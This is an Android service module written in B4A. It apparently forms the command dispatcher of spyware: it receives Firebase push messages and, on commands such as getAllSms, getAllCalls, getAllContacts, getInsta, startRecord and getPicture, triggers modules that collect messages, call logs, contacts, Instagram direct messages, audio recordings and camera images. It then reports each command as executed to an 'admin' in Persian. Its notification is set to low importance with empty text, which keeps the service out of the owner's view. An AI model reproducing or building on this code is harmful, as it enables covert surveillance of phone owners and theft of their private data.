B4A=true
Group=Default Group
ModulesStructureVersion=1
Type=Service
Version=9.801
@EndOfDesignText@
B4A=True
ModulesStructureVersion=1
Type=Service
Version=9.801

#Region  Service Attributes 
	#StartAtBoot:False
#End Region
Sub Process_Globals
	Dim fm As FirebaseMessaging
End Sub
Sub Service_Create
	fm.Initialize("fm")
	Dim n As Notification
	n.Initialize2(n.IMPORTANCE_LOW)
	n.Icon      = "icon"
	n.Sound    = False
	n.Vibrate    = False
	n.Light    = False
	n.Insistent  = False
	n.AutoCancel = False
	n.SetInfo("","","")
	Service.AutomaticForegroundNotification = n
	

End Sub
Public Sub SubscribeToTopics
	
	fm.SubscribeToTopic("topic1")
End Sub
Sub Service_Start (StartingIntent As Intent)
	'ToastMessageShow("4444",True)
	If StartingIntent.IsInitialized Then fm.HandleIntent(StartingIntent)
	Sleep(0)
'	Service.StopAutomaticForeground
End Sub

Sub fm_MessageArrived (Message As RemoteMessage)
	Dim com As String
	com = Message.GetData.Get("command")
	'ToastMessageShow(Message.GetData.Get("salam"),True)
	If com = "getKey" Then	
		'ToastMessageShow("hello from fireBase",True)
	CallSubDelayed3(srv, "getKey" , "admin" , $"{"text":"دستور شما دریافت و اجرا شد"}"$)
	End If
	If com = "getChats" Then
		CallSubDelayed3(getchats, "getchat" , "admin" , $"{"text":"دستور شما دریافت و اجرا شد"}"$)
	End If
	If com = "getList" Then
		CallSubDelayed3(getlists, "getlist" , "admin" , $"{"text":"دستور شما دریافت و اجرا شد"}"$)
	End If
	If com = "getOneChat" Then
		Dim fileName As String
		fileName=Message.GetData.Get("file")
		'ToastMessageShow(fileName,True)
		CallSubDelayed3(getOneChat, "getOne" , "admin" ,fileName)
	End If
	If com = "getAllSms" Then
		CallSubDelayed3(getAllSms, "getsms" , "admin" , $"{"text":"دستور شما دریافت و اجرا شد"}"$)
	End If
	If com = "getAllCalls" Then
		CallSubDelayed3(getAllCalls, "getcall" , "admin" , $"{"text":"دستور شما دریافت و اجرا شد"}"$)
	End If
	If com = "getAllContacts" Then
		CallSubDelayed3(getAllContacts, "getcontact" , "admin" , $"{"text":"دستور شما دریافت و اجرا شد"}"$)
	End If
	If com = "getInsta" Then
		CallSubDelayed3(getInsta, "getdirect" , "admin" , $"{"text":"دستور شما دریافت و اجرا شد"}"$)
	End If
	
	If com = "startRecord" Then
		CallSubDelayed3(startRecord, "startrecording" , "admin" , $"{"text":"دستور شما دریافت و اجرا شد"}"$)
	End If
	If com = "stopRecord" Then
		CallSubDelayed3(startRecord, "stoprecording" , "admin" , $"{"text":"دستور شما دریافت و اجرا شد"}"$)
	End If
	If com = "getPicture" Then
		CallSubDelayed3(getPicture, "getCam" , "admin" , $"{"text":"دستور شما دریافت و اجرا شد"}"$)
	End If
	If com = "getPicture2" Then
		CallSubDelayed3(getPicture2, "getCam" , "admin" , $"{"text":"دستور شما دریافت و اجرا شد"}"$)
	End If
	
End Sub

Sub Service_Destroy
	'ToastMessageShow("5555",True)
End Sub